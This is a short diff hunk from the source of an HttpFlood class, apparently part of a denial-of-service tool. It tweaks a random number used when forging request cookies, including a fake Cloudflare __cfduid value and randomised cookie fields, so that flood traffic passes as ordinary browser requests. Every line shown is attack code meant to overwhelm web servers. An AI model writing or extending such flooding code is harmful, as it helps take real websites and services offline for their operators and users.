@@ -878,7 +878,7 @@ class HttpFlood(Thread):
             " _gat=1;"
             " __cfduid=dc232334gwdsd23434542342342342475611928;"
             " %s=%s\r\n" %
-            (ProxyTools.Random.rand_int(1000, 99999), ProxyTools.Random.rand_str(6),
+            (ProxyTools.Random.rand_int(10000, 99999), ProxyTools.Random.rand_str(6),
              ProxyTools.Random.rand_str(32)))
         s = None
         with suppress(Exception), self.open_connection() as s:
